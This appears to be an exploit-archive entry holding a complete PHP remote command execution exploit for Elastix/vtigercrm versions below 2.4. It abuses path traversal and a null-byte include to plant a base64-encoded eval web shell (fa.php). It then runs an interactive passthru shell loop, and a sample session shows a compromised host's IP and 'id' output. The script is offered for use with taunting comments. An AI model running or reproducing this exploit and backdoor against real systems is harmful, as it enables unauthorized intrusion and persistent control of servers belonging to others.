@@ -1,0 +1,140 @@
+id: 20101
+date: 01/06/2013
+title: Elastix 2.3 PHP Code Injection Vulnerability
+author: i-Hmx
+cves: 
+
+<?
+/*
+Exploit Title : Elastix 2.3 , Remote Command Execution Exploit
+Google Dork : WTF!!!!
+Version: Elastix All versions below 2.3 , Newer versions maybe affected as well ;)
+Tested on: CentOS
+CVE : notyet
+Download Vuln software : elastix.org
+Author : Faris AKA i-Hmx
+Mail : n0p1337@gmail.com
+Home : sec4ever.com , 1337s.cc
+
+PhoeniX# php elastix.php
++-------------------------------------------+
+|               Elastix < 2.4               |
+|         PHP Code Injection Exploit        |
+|                  By i-Hmx                 |
+|                sec4ever.com               |
+|             n0p1337@gmail.com             |
++-------------------------------------------+
+
+| Enter Target [https://ip] # https://186.149.111.169
+| Injecting 1st payload
+| Injecting 2nd payload
+| Testing total payload
+| Sending CMD test package
+| sec4ever shell online ;)
+
+i-Hmx@186.149.111.169# id
+uid=100(asterisk) gid=101(asterisk) groups=101(asterisk)
+
+i-Hmx@186.149.111.169#
+
+*/
+echo "\n+-------------------------------------------+\n";
+echo "|               Elastix < 2.4               |\n";
+echo "|         PHP Code Injection Exploit        |\n";
+echo "|                  By i-Hmx                 |\n";
+echo "|                sec4ever.com               |\n";
+echo "|             n0p1337@gmail.com             |\n";
+echo "+-------------------------------------------+\n";
+echo "\n| Enter Target [https://ip] # ";
+$target=trim(fgets(STDIN));
+$inj='<?eval(base64_decode("JGY9Zm9wZW4oJ2ZhLnBocCcsJ3crJyk7JGRhdGE9Jzw/IGVjaG8gIkZhcmlzIG9uIHRoZSBtaWMgOkQ8YnI+LS0tLS0tLS0tLS0tLS0tLS0iO0BldmFsKGJhc2U2NF9kZWNvZGUoJF9QT1NUW2ZhXSkpO2VjaG8gIi0tLS0tLS0tLS0tLS0tLS0tIjsgPz4nO2Z3cml0ZSgkZiwkZGF0YSk7ZWNobyAiZG9uZSI7Cg==")); ?>';
+$faf=fopen("fa.txt","w+");
+fwrite($faf,$inj);
+fclose($faf);
+$myf='fa.txt';
+$url = $target."/vtigercrm/graph.php?module=../modules/Settings&action=savewordtemplate"; // URL
+$reffer = "http://1337s.cc/index.php";
+$agent = "Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.4) Gecko/20030624 Netscape/7.1 (ax)";
+$cookie_file_path = "/";
+echo "| Injecting 1st payload\n";
+$ch = curl_init(); 
+curl_setopt($ch, CURLOPT_URL, $url);
+curl_setopt($ch, CURLOPT_USERAGENT, $agent);
+curl_setopt($ch, CURLOPT_POST, 1);
+curl_setopt($ch, CURLOPT_POSTFIELDS,array("binFile"=>"@".realpath($myf)));
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+curl_setopt($ch, CURLOPT_REFERER, $reffer);
+curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie_file_path); 
+curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie_file_path); 
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+$result = curl_exec($ch);
+curl_close($ch);
+if(!eregi('<body onload=set_focus()',$result))
+{
+die("[+] Exploitation Failed\n");
+}
+echo "| Injecting 2nd payload\n";
+function faget($url,$post){
+$curl=curl_init();
+curl_setopt($curl,CURLOPT_RETURNTRANSFER,1);
+curl_setopt($curl,CURLOPT_URL,$url);
+curl_setopt($curl, CURLOPT_POSTFIELDS,$post);
+curl_setopt($curl, CURLOPT_COOKIEFILE, '/'); 
+curl_setopt($curl, CURLOPT_COOKIEJAR, '/'); 
+curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
+curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 0);
+curl_setopt($curl,CURLOPT_FOLLOWLOCATION,0);
+curl_setopt($curl,CURLOPT_TIMEOUT,20);
+curl_setopt($curl, CURLOPT_HEADER, true); 
+$exec=curl_exec($curl);
+curl_close($curl);
+return $exec;
+}
+function kastr($string, $start, $end){
+    $string = " ".$string;
+    $ini = strpos($string,$start);
+    if ($ini == 0) return "";
+    $ini += strlen($start);
+    $len = strpos($string,$end,$ini) - $ini;
+    return substr($string,$ini,$len);
+}
+$me=faget($target."/vtigercrm/graph.php?module=../test/upload&action=fa.txt%00","");
+if(!eregi("done",$me))
+{
+die("[+] Exploitation Failed\n");
+}
+echo "| Testing total payload\n";
+$total=faget($target."/vtigercrm/fa.php","");
+if(!eregi("Faris on the mic :D",$total))
+{
+die("[+] Exploitation Failed\n");
+}
+echo "| Sending CMD test package\n";
+$cmd=faget($target."/vtigercrm/fa.php","fa=cGFzc3RocnUoJ2VjaG8gZmFyc2F3eScpOw==");
+if(!eregi("farsawy",$cmd))
+{
+echo "   + Cmd couldn't executed but we can evaluate php code\n   + use : $target//vtigercrm/fa.php\n   Post : fa=base64code\n";
+}
+echo "| sec4ever shell online ;)\n\n";
+$host=str_replace('https://','',$target);
+while(1){
+echo "i-Hmx@$host# ";
+$c=trim(fgets(STDIN));
+if($c=='exit'){die("[+] Terminating\n");}
+$payload=base64_encode("passthru('$c');");
+$fuck=faget($target."/vtigercrm/fa.php","fa=$payload");
+$done=kastr($fuck,"-----------------","-----------------");
+echo "$done\n";
+}
+/*
+/*
+NP : Trace my logs very well bit#*z , Next time i will log deeeeeeep in your A$$es ;)
+   Enjoy the song : http://www.youtube.com/watch?v=d-ELnDPmI8w
+   keep in Your skiddy minds , "I Ain't Mad At Cha"
+   < Faris , The Awsome xD >
+*/
+?>
+
+#  0day.today [2023-03-22]  #
